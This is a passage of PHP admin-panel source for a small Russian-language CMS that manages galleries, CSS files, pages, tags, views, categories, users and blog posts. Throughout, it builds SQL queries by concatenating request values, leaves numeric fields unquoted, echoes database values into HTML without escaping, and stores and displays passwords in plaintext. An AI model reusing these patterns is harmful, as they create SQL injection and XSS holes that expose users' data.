  $gt=array();
  $gt[1]='Табличная';
  $gt[2]='Слева миниатюры, с права картинка';
  $gt[3]='Палароид';
  $gt[4]='LightBox';
  $r='<b>Редактирование галереи</b></br>';
  $r.='<form action="index.php" method="post">';
  $r.='<input name="do" type="hidden" value="gals_post">';
  $r.='<input name="id" type="hidden" value="'.$gal["id"].'">';
  $r.='<table>';
  $r.='<tr><td width="100" align="right" valign="center">Название:</td><td valign="center"><input style="margin:0 0 0 0;" name="g_name" type="text" value="'.$gal["name"].'"></td></tr>';
  $r.='<tr><td width="100" align="right" valign="center">Каталог:</td><td><input style="margin:0 0 0 0;" name="g_cat" type="text" value="'.$gal["cat"].'"></td></tr>';
  $r.='<tr><td width="100" align="right" valign="center">Тип:</td><td>';
  $r.='<select size="1" name="g_type" style="margin:0 0 0 0;">';
  foreach($gt as $key=>$x)
  {
    if ($key==$gal['type']) {$sel=' selected';} else {$sel='';}
  	$r.='<option value="'.$key.'"'.$sel.'>'.$x.'</option>';
  }
  $r.='</select></td></tr>';
  $r.='<tr><td width="100" align="right" valign="center">Размеры:</td><td valign="center"><input style="width:100px;display:inline;margin:0 0 0 0;" name="g_width" type="text" value="'.$gal["width"].'"> X <input style="width:100px;display:inline;margin:0 0 0 0;" name="g_height" type="text" value="'.$gal["height"].'"> Размеры картинок:<input style="width:100px;display:inline;margin:0 0 0 0;" name="g_i_width" type="text" value="'.$gal["i_width"].'"> X <input style="width:100px;display:inline;margin:0 0 0 0;" name="g_i_height" type="text" value="'.$gal["i_height"].'"></td></tr>';
  $r.='<tr><td width="100" align="right" valign="center">Миниатюры:</td><td valign="center"><input style="width:100px;display:inline;margin:0 0 0 0;" name="g_m_width" type="text" value="'.$gal["m_width"].'"> X <input style="width:100px;display:inline;margin:0 0 0 0;" name="g_m_height" type="text" value="'.$gal["m_height"].'"></td></tr>';
  $r.='<tr><td width="100" align="right" valign="center">Колонок:</td><td valign="center"><input style="width:100px;display:inline;margin:0 0 0 0;" name="g_cols" type="text" value="'.$gal["cols"].'"> Рядов: <input style="width:100px;display:inline;margin:0 0 0 0;" name="g_rows" type="text" value="'.$gal["rows"].'"></td></tr>';
  $r.='<tr><td width="100" align="right" valign="center">Подпись:</td><td valign="center"><input style="margin:0 0 0 0;" name="g_caption" type="text" value="'.$gal["caption"].'"></td></tr>';
  $r.='<tr><td width="100" align="right" valign="center">Цвет фона:</td><td valign="center"><input style="width:100px;display:inline;margin:0 0 0 0;" name="g_color" type="text" value="'.$gal["color"].'"> Рамка:<input style="width:100px;display:inline;margin:0 0 0 0;" name="g_border" type="text" value="'.$gal["border"].'"></td></tr>';
  $r.='<tr><td width="100" align="right" valign="center">Паттерн ссылки:</td><td valign="center"><input style="width:300px;display:inline;margin:0 0 0 0;" name="g_link" type="text" value="'.$gal["link"].'"> * Пример ShowImage_%src%, http://%full_src%</td></tr>';
  $r.='</table>';
  $r.='<input type="submit" value="Сохранить"></form>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminGalsPost()
{
  global $id,$user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_gals']=='rw') {
  foreach($_POST as $key=>$x){$_POST[$key]=addslashes($x);}

  if ($_POST["g_name"]=="") {$r='<font color="red">Не указанно название</font>';}
    else
      {
        if ($id>0) {$sq='update gals set name="'.$_POST['g_name'].'", `cat`="'.$_POST['g_cat'].'", type="'.$_POST['g_type'].'", width="'.$_POST['g_width'].'", height="'.$_POST['g_height'].'", cols="'.$_POST['g_cols'].'", rows="'.$_POST['g_rows'].'", caption="'.$_POST['g_caption'].'", color="'.$_POST['g_color'].'", border="'.$_POST['g_border'].'", m_width="'.$_POST['g_m_width'].'", m_height="'.$_POST['g_m_height'].'", i_width="'.$_POST['g_i_width'].'", i_height="'.$_POST['g_i_height'].'", link="'.$_POST['g_link'].'" where (id='.$id.')';}
          else {$sq='insert into gals (name, `cat`, type, width, height, m_width, m_height, i_width, i_height, cols, rows, caption, color, border, link) values ("'.$_POST['g_name'].'", "'.$_POST['g_cat'].'", "'.$_POST['g_type'].'", "'.$_POST['g_width'].'", "'.$_POST['g_height'].'", "'.$_POST['g_m_width'].'", "'.$_POST['g_m_height'].'", "'.$_POST['g_i_width'].'", "'.$_POST['g_i_height'].'", "'.$_POST['g_cols'].'", "'.$_POST['g_rows'].'", "'.$_POST['g_caption'].'", "'.$_POST['g_color'].'", "'.$_POST['g_border'].'", "'.$_POST['g_link'].'")';}
        $R = mysql_query_my ($sq) or die ("Error in AdminGalsPost<br>".mysql_error().'<br>'.$sq);
        $r=doNotice('<b>Представление сохранено</b> '.$_POST["g_name"]);
      }
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminCSS()
{
  global $id,$user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_css']=='r'||$user_dat['r_css']=='rw') {
  $r='<b>Список css файлов</b>&nbsp; <a href="index.php?do=css_edit" title="Создать css файл">+</a></br></br>';
  $r.='<table>';
  $n=0;
  $dir='../css/';
 if ($dirh = opendir($dir)) {
    while (($file = readdir($dirh)) !== false) {
      if (filetype($dir.$file)!='dir'&&substr($file,-4)==".css")
        {
         $r.='<tr><td><a href="index.php?do=css_edit&file='.$file.'">'.$file.'</a></td><td>&lt;link rel="stylesheet" type="text/css" href="css/'.$file.'" /&gt;</td><td><a href="index.php?do=css_del&file='.$file.'">X</a></td></tr>';
        }
    }
  closedir($dirh);
  }
  $r.='</table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminCSSEdit()
{
  global $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_css']=='r'||$user_dat['r_css']=='rw') {
  if (isset($_GET['file']))
    {
    	$fl=addslashes($_GET['file']);
    	if (substr($fl,-4)!=".css") {$fl='';}
   	} else {$fl='';}
  if ($fl!="")
  {
    $content=file_get_contents('../css/'.$fl);
  } else {$content='';}
  $r='Редактироване файла стилей: <b>'.$fl.'</b><br>';
  $r.='<form name="" action="index.php" method="post"><input name="do" type="hidden" value="css_post">';
  if ($fl=='') {$r.='Файл: <input name="file" type="text" value="" style="width:350px;display:inline;"><br>';}
    else {$r.='<input name="file" type="hidden" value="'.$fl.'">';}
  $r.='<textarea name="body" rows=5 cols=20 wrap="off">'.$content.'</textarea><br>';
  if ($user_dat['acl']>=1000||$user_dat['r_css']=='rw') {
  $r.='<input type="submit" value="Сохранить">&nbsp;<input type="submit" value="Сохранить и продолжить" name="save_edit">';
  }
  $r.='</form>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminCSSPost()
{
  global $do_res,$user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_css']=='rw') {
  if (isset($_POST['body'])) {$body=$_POST['body'];} else {$body='';}
  if (isset($_POST['file']))
    {
    	$fl=addslashes($_POST['file']);
    	if (substr($fl,-4)!=".css") {$fl='';}
   	} else {$fl='';}
  if ($fl=='') {$r='<font color="red">Ошибка в имени файла</font><br>';}
  else
    {
      file_put_contents('../css/'.$fl,$body);
      $r=doNotice('Сохраненно');
    }

  if (isset($_POST['save_edit'])) {$do_res='css_edit';$_GET['file']=$fl;} else {$r.=AdminCSS();}
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminPageDelete()
{
  global $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_pages']=='rw') {
  include_once('engine.php');
  $tmpl=GetPageByID($id);
  $r='<table width="100%" border=0>';
  $r.='<tr><th align="center" colspan="2">Удалить страницу</b></br>'.$tmpl["title"].'</th></tr>';

  $r.='<tr><td width="50%" align="right">';
  $r.='<form action="index.php" method="POST">';
  $r.='<input name="do" type="hidden" value="page_del">';
  $r.='<input name="id" type="hidden" value="'.$tmpl["id"].'">';
  $r.='<input type="submit" value="Удалить"></form></td>';
  $r.='<td><form action="index.php" method="GET"><input name="do" type="hidden" value="pages"><input type="submit" value="Нет"></form></td></tr></table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminPageDel()
{
  global $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_pages']=='rw') {
  include_once('engine.php');
  $tmpl=GetPageByID($id);
  $r=doNotice('Удалено:'.$tmpl["title"]);
  $R = mysql_query ('delete from pages where (id='.$id.')') or die ("Error in AdminPageDel<br>".mysql_error());
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r.AdminPages();
}
function AdminTagDelete()
{
  global $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_tags']=='rw') {
  include_once('engine.php');
  $tmpl=GetTagByID($id);
  $r='<table width="100%" border=0>';
  $r.='<tr><th align="center" colspan="2">Удалить тэг</b></br>'.$tmpl["name"].'</th></tr>';

  $r.='<tr><td width="50%" align="right">';
  $r.='<form action="index.php" method="POST">';
  $r.='<input name="do" type="hidden" value="tag_del">';
  $r.='<input name="id" type="hidden" value="'.$tmpl["id"].'">';
  $r.='<input type="submit" value="Удалить"></form></td>';
  $r.='<td><form action="index.php" method="GET"><input name="do" type="hidden" value="tags"><input type="submit" value="Нет"></form></td></tr></table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminTagDel()
{
  global $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_tags']=='rw') {
  include_once('engine.php');
  $tmpl=GetTagByID($id);
  $r=doNotice('Удалено:'.$tmpl["name"]);
  $R = mysql_query ('delete from tags where (id='.$id.')') or die ("Error in AdminTagDel<br>".mysql_error());
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r.AdminTags();
}
function BackupManager()
{
  global $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_backs']=='rw') {
  include_once("backup.php");
  $r=MakeBackupInfo();
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminViews()
{
  global $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_views']=='r'||$user_dat['r_views']=='rw') {
  $r='<b>Список представлений</b>&nbsp; <a href="index.php?do=view_edit&id=-1" title="Создать новое представление">+</a></br>';
  $r.='<table>';
  $r.='<tr><th width="100">ID</th><th>Название</th><th width="20">VAR</th><th width="20"></th></tr>';
  $R = mysql_query_my ('select id, name, asvar from views') or die ("Error in AdminViews<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
     $r.='<tr><td>'.$T["id"].'</td><td><a href="index.php?do=view_edit&id='.$T["id"].'">'.$T["name"].'</a></td><td>'.$T['asvar'].'</td><td align="center"><a href="index.php?do=view_delete&id='.$T["id"].'" title="Удалить представление">X</a></td></tr>';
 	 $T=mysql_fetch_array($R);
  }
  $r.='</table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function AdminViewEdit()
{
  global $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_views']=='rw') {
  include_once('engine.php');
  $view=GetViewbyID($id);
  $r='<b>Редактирование представление</b></br>';
  $r.='<form action="index.php" method="post">';
  $r.='<input name="do" type="hidden" value="view_post">';
  $r.='<input name="id" type="hidden" value="'.$view["id"].'">';

  $r.='<ul class="tabs left">';
  $r.='<li><a href="#tabr1">Основное</a></li>';
  $r.='<li><a href="#tabr2">Настройки</a></li>';
  $r.='</ul>';
  $r.='<div id="tabr1" class="tab-content">';
  $r.='Название:<input name="v_name" type="text" value="'.$view["name"].'" style="width:90%;display:inline;margin: 0 0 0 0;"><br>';
  $r.='SQL:<br><textarea name="v_sql" rows=5 cols=20 wrap="off" style="height:100px;margin:0px;">'.$view["sql"].'</textarea><br>';
  $r.='Контент:<textarea name="v_body" rows=5 cols=20 wrap="off" style="height:100px;margin:0px;">'.$view["body"].'</textarea><br>';
  $r.='<table style=";margin:0px;"><tr>';
  if ($view["asis"]=="Y") {$s='checked';} else {$s='';}
  $r.='<td>Как есть:<input name="v_asis" type="checkbox"'.$s.'></td>';
  if ($view["nums"]=="Y") {$s='checked';} else {$s='';}
  $r.='<td>Нумерация:<input name="v_nums" type="checkbox"'.$s.'></td>';
  $r.='<td>Зписей на страницу:<input name="page_recs" type="text" value="'.$view["page_recs"].'" style="width:90px;display:inline;margin: 0 0 0 0;"></td>';
  $r.='<td>Колонок:<input name="v_columns" type="text" value="'.$view["columns"].'" style="width:90px;display:inline;margin: 0 0 0 0;"></td>';
  if ($view["asvar"]=="Y") {$s='checked';} else {$s='';}
  $r.='<td>Как переменная:<input name="asvar" type="checkbox"'.$s.'></td>';
  $r.='</tr></table>';
  $r.='</div>';
  $r.='<div id="tabr2" class="tab-content">';
  $r.='Настройка таблицы внутренность тэга TABLE:<textarea name="v_table" rows=5 cols=20 wrap="off" style="height:50px;margin:0px;">'.$view["table_header"].'</textarea><br>';
  $r.='Настройка таблицы внутренность тэга TD:<textarea name="v_td" rows=5 cols=20 wrap="off" style="height:50px;margin:0px;">'.$view["table_td"].'</textarea><br>';
  $r.='Заголовок:<textarea name="v_header" rows=5 cols=20 wrap="off" style="height:100px;margin:0px;">'.$view["header"].'</textarea><br>';
  $r.='Подпись:<textarea name="v_bottom" rows=5 cols=20 wrap="off" style="height:100px;margin:0px;">'.$view["bottom"].'</textarea><br>';
  $r.='Поле для подсчета COUNT:<input name="grp_cnt" type="text" value="'.$view["grp_cnt"].'"><br>';
  $r.='Полея для подсчета сумм:<input name="flds_cnt" type="text" value="'.$view["flds_cnt"].'"><br>';
  $r.='</div>';
  $r.='<input type="submit" value="Сохранить"></form>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}

function AdminViewPost()
{
  global $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_views']=='rw') {
  foreach($_POST as $key=>$x){$_POST[$key]=addslashes($x);}

  if (isset($_POST['v_asis'])) {$_POST['v_asis']='Y';} else {$_POST['v_asis']='N';}
  if (isset($_POST['v_nums'])) {$_POST['v_nums']='Y';} else {$_POST['v_nums']='N';}
  if (isset($_POST['asvar'])) {$_POST['asvar']='Y';} else {$_POST['asvar']='N';}
  if ($_POST["v_name"]=="") {$r=doNotice('Не указанно название','error');}
    else
      {
        if ($id>0) {$sq='update views set name="'.$_POST['v_name'].'", `sql`="'.$_POST['v_sql'].'", body="'.$_POST['v_body'].'", asis="'.$_POST['v_asis'].'", header="'.$_POST['v_header'].'", bottom="'.$_POST['v_bottom'].'", nums="'.$_POST['v_nums'].'", columns='.$_POST['v_columns'].', page_recs='.$_POST['page_recs'].', table_header="'.$_POST['v_table'].'", table_td="'.$_POST['v_td'].'", asvar="'.$_POST['asvar'].'", grp_cnt="'.$_POST['grp_cnt'].'", flds_cnt="'.$_POST['flds_cnt'].'" where (id='.$id.')';}
          else {$sq='insert into views (name, `sql`, body, asis, header, bottom, nums, columns, page_recs, table_header, table_td, asvar,grp_cnt,flds_cnt) values ("'.$_POST['v_name'].'", "'.$_POST['v_sql'].'", "'.$_POST['v_body'].'", "'.$_POST['v_asis'].'", "'.$_POST['v_header'].'", "'.$_POST['v_bottom'].'", "'.$_POST['v_nums'].'", '.$_POST['v_columns'].', '.$_POST['page_recs'].', table_header="'.$_POST['v_table'].'", "'.$_POST['v_td'].'", "'.$_POST['asvar'].'","'.$_POST['grp_cnt'].'","'.$_POST['flds_cnt'].'")';}
        $R = mysql_query_my ($sq) or die ("Error in AdminTagPost<br>".mysql_error());
        $r=doNotice('<b>Представление сохранено</b> '.$_POST["v_name"]);
      }
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function Cats ()
{
  global $do_res, $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_blogs']=='r'||$user_dat['r_blogs']=='rw') {
  $r='<b>Редакирование категорий</b>&nbsp; <a href="index.php?do=cats_edit&id=-1" title="Создать новую">+</a> <font color="green">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ToDo: Запретить удалять занятые категории</font></br>';
  $r.='<table>';
  $r.='<tr><th width="*">Название</th><th width="150">Родитель</th><th width="20">Тип</th><th width="20"></th></tr>';
  $R = mysql_query ('select blog_cats.id, blog_cats.id_up, blog_cats.name, bc.name as cat, blog_cats.type from blog_cats left join blog_cats as bc on bc.id=blog_cats.id_up') or die ("Error in Cats<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
       switch ($T['type']) {
         case "0":
             $T['type']="Категория";
             break;
         case "1":
             $T['type']="Тэг";
             break;
         case "2":
             $T['type']="Новость";
             break;
     }
     //if ($T['type']==0) {$T['type']='Категория';} else {$T['type']='Тэг';}
     $r.='<tr><td><a href="index.php?do=cats_edit&id='.$T["id"].'">'.$T["name"].'</a><td>'.$T['cat'].'</td><td>'.$T['type'].'</td></td><td align="center"><a href="index.php?do=cats_delete&id='.$T["id"].'" title="Удалить категорию">X</a></td></tr>';
 	 $T=mysql_fetch_array($R);
  }
  $r.='</table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function CatsEdit()
{
  global $do_res, $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_blogs']=='rw') {
  include_once('engine.php');
  $cat=GetCatByID($id);
  $r='<b>Редактирование категория</b></br>';
  $r.='<form action="index.php" method="post">';
  $r.='<input name="do" type="hidden" value="cats_post">';
  $r.='<input name="id" type="hidden" value="'.$cat["id"].'">';
  $r.='<div style="width:100px;display:inline-block;">Название:</div><input style="width:400px;display:inline;" name="cat_name" type="text" value="'.$cat["name"].'"><br>';
  $r.='<div style="width:100px;display:inline-block;">Тип:</div><select size="1" name="cat_type" style="width:400px;display:inline;">';
  $cat_temp=array ();
  $cat_temp[0]='Категория';$cat_temp[1]='Тэг';$cat_temp[2]='Новости';
  foreach($cat_temp as $key=>$x)
  {  	if ($cat["type"]==$key) {$s=' selected';} else {$s='';}
  	$r.='<option value="'.$key.'"'.$s.'>'.$x.'</option>';  }

  $r.='</select><br>';
  $ct=GetAllCats('blog_cats.type=0','name');
  $r.='<div style="width:100px;display:inline-block;">Родитель:</div> <select size="1" name="id_up" style="width:400px;display:inline;">';
  if ($cat['id_up']==-1) {$r.='<option value="-1" selected> Не указанна</option>';} else {$r.='<option value="-1"> Не указанна</option>';}
  foreach($ct as $key=>$x)
  {
    $s='';if ($cat['id_up']==$x['id']) {$s=' selected';}
    $r.='<option value="'.$x['id'].'" '.$s.'>'.$x['name'].'</option>';
  }
  $r.='</select>';
  $r.='<br><input type="submit" value="Сохранить">';
  $r.='</form>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function CatsPost()
{
  global $do_res, $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_blogs']=='rw') {
  foreach($_POST as $key=>$x){$_POST[$key]=mysql_real_escape_string($x);}
  if ($id==-1) {$sq='insert into blog_cats (id_up, name, type) values ('.$_POST['id_up'].',"'.$_POST['cat_name'].'",'.$_POST['cat_type'].')';}
    else {$sq='update blog_cats set id_up='.$_POST['id_up'].', name="'.$_POST['cat_name'].'", type='.$_POST['cat_type'].' where (id='.$id.')';}
  mysql_query ($sq) or die ("Error in CatsPost<br>".mysql_error());
  $r=doNotice('<b>Сохраненно</b>').Cats();
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function CatsDelete()
{
  global $do_res, $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_blogs']=='rw') {
  include_once('engine.php');
  $tmpl=GetCatByID($id);
  $r='<table width="100%" border=0>';
  $r.='<tr><th align="center" colspan="2">Удалить категорию</b></br>'.$tmpl["name"].'</th></tr>';

  $r.='<tr><td width="50%" align="right">';
  $r.='<form action="index.php" method="POST">';
  $r.='<input name="do" type="hidden" value="cats_del">';
  $r.='<input name="id" type="hidden" value="'.$tmpl["id"].'">';
  $r.='<input type="submit" value="Удалить"></form></td>';
  $r.='<td><form action="index.php" method="GET"><input name="do" type="hidden" value="cats"><input type="submit" value="Нет"></form></td></tr></table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function CatsDel()
{
  global $do_res, $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_blogs']=='rw') {
  include_once('engine.php');
  $tmpl=GetCatByID($id);
  $r=doNotice('Удалено:'.$tmpl["name"]);
  $R = mysql_query ('delete from blog_cats where (id='.$id.')') or die ("Error in CatsDel<br>".mysql_error());
  $r.=Cats();
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function UsersManager()
{
  global $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_users']=='r'||$user_dat['r_users']=='rw') {
  $r='<b>Пользователи</b>&nbsp; <a href="index.php?do=user_edit&id=-1" title="Создать нового пользователя">+</a></br>';
  $r.='<table>';
  $r.='<tr><th width="90">ID</th><th>Пользователь</th><th>ФИО</th><th>ACL</th><th width="20"></th></tr>';
  $R = mysql_query ('select id, fio, user, acl from adm_users where (acl<='.$user_dat['acl'].')') or die ("Error in UsersManager<br>".mysql_error());
  $T=mysql_fetch_array($R);
  while (is_array($T))
  {
     $r.='<tr><td>'.$T["id"].'</td><td><a href="index.php?do=user_edit&id='.$T["id"].'">'.$T["user"].'</a></td><td>'.$T["fio"].'</td><td>'.$T["acl"].'</td><td align="center"><a href="index.php?do=user_delete&id='.$T["id"].'" alt="Удалить пользователя">X</a></td></tr>';
 	 $T=mysql_fetch_array($R);
  }
  $r.='</table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function DoRights ($label,$var_name, $rg)
{
  $sel=array();
  $sel['']='Нет доступа';
  $sel['r']='Только для чтения';
  $sel['rw']='Полный доступ';
  $r='<div style="width:100px;display:inline-block;">'.$label.': </div><select style="width:200px;display:inline;" size="1" name="'.$var_name.'">';
  foreach($sel as $key=>$x) {
    if ($key==$rg) {$s=' selected';} else {$s='';}
    $r.='<option value="'.$key.'"'.$s.'>'.$x.'</option>';
  }
 $r.='</select>';
 return $r;
}
function UsersEdit()
{
  global $do_res, $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_users']=='rw'||$user_dat['id']==$id) {
  include_once('engine.php');
  $usr=GetUserByID($id);
  $r='<b>Редакирование пользователя</b>';

  $r.='<form action="index.php" method="POST">';
  $r.='<input name="do" type="hidden" value="user_post">';
  $r.='<input name="id" type="hidden" value="'.$usr["id"].'">';
  $r.='<div style="width:100px;display:inline-block;text-align:right;">Пользователь: &nbsp;</div><input style="width:400px;display:inline;" name="u_user" type="text" value="'.$usr["user"].'"></br>';
  $r.='<div style="width:100px;display:inline-block;text-align:right;">Пароль: &nbsp;</div><input style="width:400px;display:inline;" name="u_pass" type="text" value="'.$usr["pass"].'"></br>';
  $r.='<div style="width:100px;display:inline-block;text-align:right;">ФИО: &nbsp;</div><input style="width:400px;display:inline;" name="u_fio" type="text" value="'.$usr["fio"].'"></br>';
  $r.='<div style="width:100px;display:inline-block;text-align:right;">Acl: &nbsp;</div><input style="width:400px;display:inline;" name="u_acl" type="text" value="'.$usr["acl"].'"></br>';
  if ($user_dat['acl']>=1000) { // Только админ с acl>=1000 может растовлять доступы
  $r.='<hr style="margin:0 0 0 0;">Доступы:<table>';
  $r.='<tr>';
  $r.='<td valign="top">'.DoRights("Пользователи",'ur_users',$usr["r_users"]).'</td>';
  $r.='<td valign="top">'.DoRights("Шаблоны",'ur_tampls',$usr["r_tampls"]).'</td>';
  $r.='<td valign="top">'.DoRights("Страницы",'ur_pages',$usr["r_pages"]).'</td>';
  $r.='<td valign="top">'.DoRights("Тэги",'ur_tags',$usr["r_tags"]).'</td>';
  $r.='</tr><tr>';
  $r.='<td valign="top">'.DoRights("Представления",'ur_views',$usr["r_views"]).'</td>';
  $r.='<td valign="top">'.DoRights("Галереи",'ur_gals',$usr["r_gals"]).'</td>';
  $r.='<td valign="top">'.DoRights("Стили",'ur_css',$usr["r_css"]).'</td>';
  $r.='<td valign="top">'.DoRights("Блог",'ur_blogs',$usr["r_blogs"]).'</td>';
  $r.='</tr><tr>';
  $r.='<td valign="bottom">'.DoRights("Резервное копирование",'ur_backs',$usr["r_backs"]).'</td>';
  $r.='<td valign="bottom">'.DoRights("Настройки",'ur_prefs',$usr["r_prefs"]).'</td>';
  $r.='</tr>';
  $r.='</table>'; }
  $r.='<input type="submit" value="Сохранить"></form>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r;
}
function UsersPost()
{
  global $do_res, $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_users']=='rw'||$user_dat['id']==$id) {
  $r=doNotice('<b>Данные пользователя обновлены</b>');
  $rights='';
  foreach($_POST as $key=>$x){if ($key!='cats')
  {
  	$_POST[$key]=mysql_real_escape_string($x);}
  	if (substr($key,0,3)=='ur_') {$rights.=substr($key,3).'='.$x.'&';}
  }
  if ($_POST["u_acl"]+0>$user_dat['acl']) {$_POST["u_acl"]=$user_dat['acl'];}
  if ($_POST["u_acl"]+0>1001) {$_POST["u_acl"]='1001';}
  if ($id==-1) {
     mysql_query ('insert into adm_users (user, pass, acl, rights, fio) values ("'.$_POST["u_user"].'", "'.$_POST["u_pass"].'", "'.$_POST["u_acl"].'", "'.$rights.'", "'.$_POST["u_fio"].'")') or die ("Error in UsersPost<br>".mysql_error());
  } else {
     mysql_query ('update adm_users set user="'.$_POST["u_user"].'", pass="'.$_POST["u_pass"].'", acl="'.$_POST["u_acl"].'", rights="'.$rights.'", fio="'.$_POST["u_fio"].'" where (id='.$id.')') or die ("Error in UsersPost<br>".mysql_error());
    }


  } else {$r=doNotice('<b>Нет доступа</b>','error');}
  return $r.UsersManager();
}

function FindCatName (&$cats, $id)
{
  $r='Не определенна';
  foreach($cats as $key=>$x)
  {
  	if ($x['id']==$id) {$r=$x['name'];break;}
  }
  return $r;
}
function Blogs()
{
 global $user_dat;
 if ($user_dat['acl']>=1000||$user_dat['r_blogs']=='r'||$user_dat['r_blogs']=='rw') {
 $cats=GetAllCats('','name');
 $r='<b>Все записи</b> &nbsp; <a href="index.php?do=blog_edit&id=-1" title="Создать новую">+</a>';
 $r.='<table>';
 $r.='<tr><th width="120">Дата</th><th width="500">Заголовок</th><th>Категории</th><th>Опубликованн</th><th>Просмотров</th><th>Ссылка</th><th width="20"></th></tr>';
 $R = mysql_query ('select id, dt, active, title, link, cnt from blog order by dt desc') or die ("Error in Blogs<br>".mysql_error());
 $T=mysql_fetch_array($R);
 while (is_array($T))
  {
     $ct='';
     $RR = mysql_query ('select id_cat from blog_data where (id_blog='.$T['id'].')') or die ("Error in Blogs Cats<br>".mysql_error());
     $TT=mysql_fetch_array($RR);
     while (is_array($TT))
     {
       $ct.=', '.FindCatName($cats, $TT['id_cat']);
   	   $TT=mysql_fetch_array($RR);
     }
     $ct=substr($ct,2);
     $d=substr($T["dt"],8,2).'-'.substr($T["dt"],5,2).'-'.substr($T["dt"],0,4);
     $a='Нет';
     if ($T["active"]=="Y") {$a='Да';}
     $r.='<tr><td>'.$d.'</td><td><a href="index.php?do=blog_edit&id='.$T["id"].'">'.$T["title"].'</a></td><td>'.$ct.'</td><td>'.$a.'</td><td>'.$T["cnt"].'</td><td>'.$T["link"].'</td><td align="center"><a href="index.php?do=blog_delete&id='.$T["id"].'" title="Удалить">X</a></td></tr>';
 	 $T=mysql_fetch_array($R);
  }
 $r.='</table>';
  } else {$r=doNotice('<b>Нет доступа</b>','error');}
 return $r;
}
function BlogEdit()
{
  global $head_html, $do_res, $id, $user_dat;
  if ($user_dat['acl']>=1000||$user_dat['r_blogs']=='rw') {
  $r='<b>Редактирование записи</b><br>';
  include_once('engine.php');
  $blog=GetBlogRecordByID ($id);
  //$r.=print_r($blog, true).'<hr>';
  $r.='<form action="index.php" method="post">';
  $r.='<input name="do" type="hidden" value="blog_post">';
  $r.='<input name="id" type="hidden" value="'.$blog["id"].'">';
  $r.='Дата: <input name="dt" class="date" style="width:150px; margin:0 0 0 0;display:inline;" value="'.$blog["dt"].'">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
  $r.='Заголовок: <input name="title" type="text" value="'.$blog["title"].'" style="width:550px;margin:0 0 0 0;display:inline;"><br>';
  $r.='<table><tr><td valign="top" width="800"><textarea id="editor1" class="ckeditor" name="body" rows=5 cols=20 wrap="off">'.$blog["body"].'</textarea>';
  $r.='</td>';
  $cats=GetAllCats('','name');
  $r.='<td valign="top">Категории:<br>';
  foreach($cats as $key=>$x)
  {
    $s='';
    if (array_key_exists($x['id'],$blog['cats'])) {$s=' checked';}
    $r.='<div style="display:inline-block;"><input name="cats['.$x['id'].']" type="checkbox" value="ON"'.$s.'> '.$x['name'].'</div> ';
  }
  $r.='<hr style="margin:5px 0;">Ссылка:<input name="link" type="text" value="'.$blog["link"].'" style="margin:0 0 0 0;display:inline;"><hr>';
  $a='';
  if ($blog["active"]=="Y") {$a=' checked';}
  $r.='Опубликованна: <input name="b_active" type="checkbox"'.$a.'>';
  $r.='</td></tr></table>';
  $r.='Миниатюра:';
  $r.='<input style="width:400px; margin:0 0 0 0;display:inline;" type="text" id="srcFile_function" name="srcFile_function" value="'.$blog["img"].'" size="50" />&nbsp;<input style="margin:0 0 0 0;display:inline;" type="button" value="Выбрать" onclick="AjexFileManager1.open({returnTo: \'insertValue\'});" /><br>';
  $r.='Краткое описание:<textarea style="height:150px; margin:0 0 0 0;" name="note" rows=5 cols=20 wrap="off">'.$blog["note"].'</textarea>';
  $r.='<input type="submit" value="Сохранить"></form>';
  $ingtml=file_get_contents('ckeditor/inhtml.dat');
  $r.=$ingtml;      //<script type="text/javascript" src="/demo/AjexFileManager/AjexFileManager/ajex.js"></script>
